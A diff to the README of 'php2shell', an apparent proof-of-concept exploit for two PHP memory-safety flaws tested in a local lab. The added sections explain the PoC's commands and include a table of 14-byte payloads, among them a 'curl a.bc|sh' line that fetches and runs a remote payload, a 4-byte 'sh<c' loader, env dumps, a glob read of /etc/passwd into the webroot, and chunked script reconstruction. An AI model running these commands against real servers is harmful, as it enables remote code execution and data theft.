@@ -29,6 +29,19 @@ need to carry a test to a real target. No shared folders. No planted files. No L
 
 ---
 
+## See it work
+
+A real run against the lab — fingerprint → offsets → confirmed RCE → `/etc/passwd`
+read back over HTTP, then the blind timing proof that writes nothing:
+
+![php2shell PoC — a real run against the lab](docs/img/poc-demo.png)
+
+Every line in that capture comes straight out of the tooling in this repo. The proof
+file is read back over plain HTTP from the container's own `www-data`-owned webroot —
+there is no shared folder and nothing was pre-planted.
+
+---
+
 ## What is php2shell?
 
 `php2shell` is the nickname for two PHP-core memory-safety flaws disclosed and patched
@@ -193,9 +206,87 @@ shared folder tells you nothing about a real target.
 
 The command rides inside a fixed **167-byte** heap object alongside a forged `HashTable`,
 `execute_data`, and string header. The command field is just the tail: `167 − 152 − 1`
-(NUL) = **14 bytes**. That's enough to prove RCE (`sleep 8`) or to load more
-(`sh</tmp/c`, an 8-byte loader for an arbitrarily long staged script). It is a structural
-limit, not a configurable one.
+(NUL) = **14 bytes**. It is a structural limit, not a configurable one — see
+[Living inside 14 bytes](#living-inside-14-bytes) for what you can actually do with it.
+
+---
+
+## What the PoC does, and why `sleep` and `cat /e*/p*`
+
+The driver (`p2s.py`) defaults to two commands, each chosen on purpose.
+
+**`sleep 8` — the blind proof (default for `p2s_verify.py`).**
+It is the *safest possible* demonstration of code execution:
+
+- It **writes nothing, sends nothing, reads nothing** — it only makes the HTTP
+  response hang. A normal request returns in well under a second; if the destructor
+  actually ran, the response is delayed ~8 seconds. That timing gap is an
+  **unforgeable** signal that your code executed.
+- It leaves **zero artifacts** on the target — no dropped file, no network egress, no
+  log of exfiltrated data. Exactly what you want when all you're authorized to do is
+  answer *"is this box exploitable, yes or no?"*
+- At 7 bytes it sits comfortably inside the 14-byte limit.
+
+**`cat /e*/p*` — the tangible proof (default for `p2s.py`).**
+When you need something to put in a report or a screenshot, reading a file the attacker
+should never see is the classic low-impact demonstration:
+
+- `/etc/passwd` is present on every Linux host and contains **no secrets** (no password
+  hashes), so it's a safe, universal "I can read server files" proof.
+- Writing the path literally is too long: `cat /etc/passwd>poc` is 19 bytes. The
+  **glob trick** `/e*/p*` expands to `/etc/passwd` (and `/etc/profile`, `/etc/pam.conf`)
+  on the shell, collapsing the command to `cat /e*/p*>poc` — exactly **14 bytes**.
+- The output lands in a `poc` file in the server's normal `www-data`-owned webroot and
+  is **read back over HTTP** — proving a real exfiltration path with **no shared mount
+  and nothing pre-staged**. (That's the whole point of the lab being realistic.)
+
+So: `sleep` proves execution with no footprint; `cat /e*/p*` proves file access with a
+minimal, overt, readable-over-HTTP footprint. Neither needs an LFI or a volume mount.
+
+---
+
+## Living inside 14 bytes
+
+14 bytes feels tiny, but it is plenty — because a short command can *start* something
+much larger. The whole command (including any `>`/`<` redirection) must be ≤14 bytes:
+
+| Command | Bytes | What it does | Footprint |
+|---|---:|---|---|
+| `sleep 8` | 7 | hang the response 8s — pure timing proof | **none** (writes nothing) |
+| `id>poc` | 6 | `uid=33(www-data)` → webroot, read over HTTP | 1 file |
+| `pwd>>poc` | 8 | current directory (appends) | file |
+| `ls>poc` | 6 | list the webroot | file |
+| `env>poc` | 7 | process environment | file |
+| `uname>poc` | 9 | kernel / arch string | file |
+| `cat /e*/p*>poc` | 14 | `/etc/passwd` via glob → webroot | file |
+| `sh<c` | 4 | **run an arbitrarily long script** staged as `./c` | depends on `c` |
+| `curl a.bc\|sh` | 12 | fetch + run a remote payload (short domain you own) | network egress |
+
+The last two rows are the escape hatch: once you can run **4 bytes** (`sh<c`), the real
+limit is gone — that 4-byte loader executes a staged script of any length.
+
+### Theoretically: beating the limit entirely
+
+The 14-byte cap bounds a *single* command, not what you can ultimately run. Two paths
+get you to arbitrary-length execution:
+
+- **Rebuild a file on the target, a few bytes at a time.** Each shot appends a fragment
+  with `>>`, e.g. `echo AB>>c` (10 bytes) writes two bytes into `c`. Across many
+  requests you reconstruct an arbitrary-length script in the webroot, then run it with
+  the 4-byte loader `sh<c`. No network, no second bug — just patience. (A 14-byte
+  window can't hold a routable IP **and** a port, which is exactly why a *direct*
+  network callback doesn't fit — reconstruction sidesteps that.)
+- **Pull it over the network with a short domain you own.** `curl a.bc|sh` (12 bytes)
+  fits when the domain is ≤6 characters (`curl ` = 5, `|sh` = 3, leaving 6). Point a
+  cheap short domain at your payload server and the loader fetches and runs a script of
+  any size. `wget`/`fetch` variants work the same way where present. The constraint
+  isn't the exploit — it's owning a short enough name so the whole cradle stays ≤14 B.
+
+In other words, 14 bytes is a speed bump, not a wall: it shapes the tradecraft (globs,
+short loaders, short domains, chunked reconstruction) without ever removing the
+capability. This repo ships only the restrained defaults (`sleep`, `cat /e*/p*`,
+`sh<PATH`); the rest is documented here so defenders understand what the limit does and
+doesn't buy them.
 
 ---
 
